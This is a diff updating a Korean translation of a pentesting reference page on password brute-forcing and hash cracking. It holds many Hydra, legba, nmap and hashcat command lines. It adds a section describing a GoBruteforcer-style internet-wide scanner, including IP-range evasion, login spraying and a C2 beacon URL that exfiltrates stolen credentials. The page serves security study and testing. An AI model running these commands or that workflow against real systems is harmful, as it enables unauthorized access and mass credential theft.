@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## 기본 자격 증명
+## Default Credentials
 
-**Search in google** 사용 중인 기술의 기본 자격 증명을 검색하거나, **다음 링크들**을 시도해 보세요:
+**Search in google** 사용 중인 기술의 default credentials을 검색하거나, **다음 링크들을 시도해보세요**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **자신만의 딕셔너리 생성**
+## **자체 사전 생성**
 
-대상에 대해 가능한 많은 정보를 수집하여 맞춤형 딕셔너리를 생성하세요. 도움이 될 수 있는 도구:
+타깃에 대해 가능한 한 많은 정보를 수집하여 커스텀 사전을 생성하세요. 도움이 될 수 있는 도구:
 
 ### Crunch
 ```bash
@@ -47,13 +47,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-피해자(이름, 날짜 등)에 대한 지식을 바탕으로 passwords를 생성합니다.
+피해자에 대한 지식(이름, 날짜 등)을 기반으로 비밀번호를 생성합니다
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-단어 집합을 입력하면 주어진 단어들로부터 여러 변형을 만들어 특정 대상에 사용하기에 적합한 고유하고 이상적인 wordlist를 생성할 수 있는 도구.
+단어 집합을 제공하면, 제공된 단어들로부터 여러 변형을 만들어 특정 대상에 사용할 고유하고 이상적인 wordlist를 생성할 수 있게 해주는 wordlist generator tool.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -87,9 +87,17 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## 서비스
+## 인터넷 전역 bruteforcer 워크플로우 (Go 기반 스캐너에서 얻은 교훈)
 
-서비스 이름을 기준으로 알파벳순으로 정렬됨.
+- **아키텍처에 최적화된 worker pools**를 유지하라(예: `x86_64/arm64`에서 ~95 goroutines, `i686`에서 ~85, 저사양 ARM에서 ~50) — 초마다 다시 생성(respawn)해 **고정된 동시성(fixed concurrency)**을 유지하고, 각 워커는 종료 전에 정확히 하나의 대상 IP만 처리한다.
+- **무작위 public IPv4s**를 생성하되 명백히 허니팟이 많은 또는 라우팅 불가한 범위는 제외: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, 멀티캐스트 `>=224.0.0.0/4`, 클라우드 편중 `/8`들 (`3/15/16/56`) 및 DoD 관련 `/8`들 (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- 시도 전에 짧은 타임아웃(~2s)으로 서비스 포트를 probe하고 cleartext logins(FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin over HTTP/80)을 시도하며, 원격 dictionary/C2 fetch가 실패하면 작은 builtin credential list로 폴백한다.
+- 탐지된 히트(hits)는 `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` 같은 작은 HTTP GET 비콘으로 exfiltrate하고(서비스 코드 예: `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), 일반 브라우저 User-Agent를 재사용해 섞인다.
+- **phpMyAdmin spray**는 `GET /index.php?lang=en`으로 약 수십 개의 후보 경로(~80+)를 brute-force할 수 있고, PMA 마커(`pmahomme` theme/`phpmyadmin.css`/`navigation.php`)를 탐지하며 `codemirror.css?v=X.Y.Z`를 파싱해 인증 분기를 판단한다: 버전 `<4.9`는 GET 파라미터 `pma_username`/`pma_password`를 허용하고, 버전 `>=4.9`는 `server=1`, CSRF `token`, 동일한 자격 증명이 포함된 POST를 요구한다.
+
+## Services
+
+서비스 이름 기준 알파벳순으로 정렬.
 
 ### AFP
 ```bash
@@ -157,14 +165,14 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - POST 폼
+### HTTP - Post 폼
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
 http**s**의 경우 "http-post-form"에서 "**https-post-form"**로 변경해야 합니다
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla 또는 (D)rupal 또는 (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
@@ -284,11 +292,11 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**oracle_login**을 **patator**과 함께 사용하려면 **install**이 필요합니다:
+**oracle_login**을 **patator**와 함께 사용하려면 다음을 **설치**해야 합니다:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**버전 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** 및 **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -315,7 +323,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-설치하려면 `.deb` 패키지를 다음에서 다운로드할 수 있습니다: [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
+설치하려면 `.deb` 패키지를 [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)에서 다운로드할 수 있습니다
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
@@ -410,13 +418,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### 취약한 SSH 키 / Debian 예측 가능한 PRNG
+#### 취약한 SSH 키 / Debian predictable PRNG
 
-일부 시스템은 cryptographic material을 생성할 때 사용하는 random seed에 알려진 결함이 있습니다. 이로 인해 keyspace가 크게 축소되어 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)와 같은 도구로 bruteforce가 가능합니다. 또한 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)와 같은 미리 생성된 취약한 키 세트도 이용할 수 있습니다.
+일부 시스템은 암호화 자재(cryptographic material)를 생성할 때 사용되는 난수 시드(random seed)에 알려진 결함이 있습니다. 이로 인해 keyspace가 크게 줄어들어 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) 같은 도구로 bruteforced할 수 있습니다. 또한 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) 같은 사전 생성된 weak keys 세트도 이용 가능합니다.
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-STOMP 텍스트 프로토콜은 RabbitMQ, ActiveMQ, HornetQ, OpenMQ와 같은 인기 있는 메시지 큐 서비스와의 원활한 통신 및 상호작용을 가능하게 하는 널리 사용되는 메시징 프로토콜입니다. 메시지를 교환하고 다양한 메시징 작업을 수행하기 위한 표준화되고 효율적인 접근 방식을 제공합니다.
+STOMP 텍스트 프로토콜은 RabbitMQ, ActiveMQ, HornetQ 및 OpenMQ와 같은 인기 있는 메시지 큐 서비스와 **원활한 통신과 상호작용을 가능하게 하는** 널리 사용되는 메시징 프로토콜입니다. 메시지를 교환하고 다양한 메시징 작업을 수행하기 위한 표준화되고 효율적인 접근 방식을 제공합니다.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -456,7 +464,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 ## 로컬
 
-### 온라인 cracking 데이터베이스
+### 온라인 cracking databases
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
 - [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
@@ -470,7 +478,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Hash를 brute force로 시도하기 전에 먼저 확인하세요.
+Hash를 brute force하기 전에 확인하세요.
 
 ### ZIP
 ```bash
@@ -490,9 +498,8 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-암호화된 zip의 **plaintext**(또는 plaintext의 일부) **안에 포함된 파일의** 내용을 알고 있어야 합니다.  
-암호화된 zip에서 **안에 포함된 파일들의 파일명과 크기**를 확인하려면 다음을 실행하세요: **`7z l encrypted.zip`**\  
-릴리스 페이지에서 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)을 다운로드하세요.
+암호화된 zip 안에 포함된 파일의 **plaintext**(또는 **plaintext**의 일부)를 알아야 합니다. 암호화된 zip에서 **filenames and size of files contained inside**를 확인하려면 다음을 실행하세요: **`7z l encrypted.zip`**\  
+릴리즈 페이지에서 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)을 다운로드하세요.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -526,7 +533,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### PDF Owner Password
 
-PDF Owner password를 crack하려면 다음을 확인하세요: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+PDF Owner password를 크래킹하려면 다음을 확인하세요: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -588,7 +595,7 @@ mount /dev/mapper/mylucksopen /mnt
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
-### PGP/GPG Private key
+### PGP/GPG 개인 키
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
@@ -599,14 +606,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-다음 스크립트 [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)를 사용한 다음 john을 실행하세요
+다음 스크립트 [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py]을 사용한 다음 john을 실행하세요
 
-### Open Office Pwd Protected Column
+### Open Office 비밀번호로 보호된 열
 
-열이 비밀번호로 보호된 xlsx 파일이 있는 경우 보호를 해제할 수 있습니다:
+컬럼이 비밀번호로 보호된 xlsx 파일이 있으면 보호를 해제할 수 있습니다:
 
-- **google drive에 업로드**하면 비밀번호가 자동으로 제거됩니다
-- **수동으로** **제거**하려면:
+- **Upload it to google drive** 하면 비밀번호는 자동으로 제거됩니다
+- 이것을 **수동으로** **제거**하려면:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -615,7 +622,7 @@ hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UV
 # Remove that line and rezip the file
 zip -r file.xls .
 ```
-### PFX 인증서
+### PFX Certificates
 ```bash
 # From https://github.com/Ridter/p12tool
 ./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
@@ -640,13 +647,13 @@ hash-identifier
 
 ### **Wordlist Generation Tools**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 고급 keyboard-walk generator로, 구성 가능한 base chars, keymap 및 routes를 제공합니다.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 구성 가능한 base chars, keymap 및 routes를 갖춘 고급 keyboard-walk 생성기.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
 ### John mutation
 
-_**/etc/john/john.conf**_을 읽고 구성하세요.
+_**/etc/john/john.conf**_를 읽고 구성하세요.
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
@@ -657,14 +664,14 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 - **Wordlist attack** (`-a 0`) 규칙과 함께
 
-**Hashcat**에는 이미 **규칙을 포함한 폴더**가 함께 제공되지만, [**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)에서 다른 흥미로운 규칙을 찾을 수 있습니다.
+**Hashcat**는 이미 **규칙이 포함된 폴더**와 함께 제공되지만 [**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)에서 다른 흥미로운 규칙을 찾을 수 있습니다.
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-- **Wordlist combinator** attack
+- **Wordlist combinator** 공격
 
-hashcat으로 **2개의 wordlists를 하나로 결합**할 수 있다.\
-예를 들어, 리스트 1에 **"hello"**가 포함되어 있고, 두 번째 리스트에 **"world"**와 **"earth"**가 각각 한 줄씩 포함되어 있다면, `helloworld`와 `helloearth`가 생성된다.
+hashcat으로 **combine 2 wordlists into 1** 할 수 있다.\
+만약 list 1에 **"hello"**라는 단어가 있고, 두 번째 list에 **"world"**와 **"earth"**라는 두 줄이 있다면, `helloworld`와 `helloearth`가 생성된다.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -731,7 +738,7 @@ Cracking Windows Hashes
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-Cracking 일반 애플리케이션 hashes
+Cracking 일반적인 애플리케이션 Hashes
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -741,4 +748,8 @@ Cracking 일반 애플리케이션 hashes
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
 ```
+## 참고 자료
+
+- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+
 {{#include ../banners/hacktricks-training.md}}
